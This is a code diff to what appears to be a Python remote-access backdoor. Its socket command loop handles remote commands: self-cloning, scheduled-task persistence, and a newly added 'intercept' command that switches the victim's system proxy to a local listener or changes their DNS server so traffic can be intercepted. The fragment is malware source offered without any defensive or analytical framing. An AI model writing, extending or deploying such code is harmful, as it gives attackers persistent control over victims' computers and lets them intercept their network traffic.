@@ -79,7 +79,23 @@ def socket_control(host,port,buffer):
 							if (clone(sys.argv[0]) == True):
 								socket_server.send(encode("\nSuccessfully cloned myself\n"))
 							else:
-								socket_server.send(encode("\nError during cloning of myself\n"))				
+								socket_server.send(encode("\nError during cloning of myself\n"))
+						# 
+						# intercept is under construction
+						# 
+						elif (data.split()[0] == "intercept"):
+							if (data.split()[1] == "proxy"):
+								if (change_proxy("127.0.0.1:8080",0x00000001) == True):
+									socket_server.send(encode("\nSuccessfully enabled proxy server\n"))
+								else:
+									socket_server.send(encode("\nError enabling proxy server\n"))
+							elif (data.split()[1] == "dns"):
+								if (change_dns("8.8.8.8") == True):
+									socket_server.send(encode("\nSuccessfully changed DNS server\n"))
+								else:
+									socket_server.send(encode("\nError while changing DNS server\n"))
+							else:
+								pass
 						elif (data.split()[0] == "schtasks"):
 							if (data.split()[1] == "create"):
 								if (create_task(data.split()[2],data.split()[3]) == True):
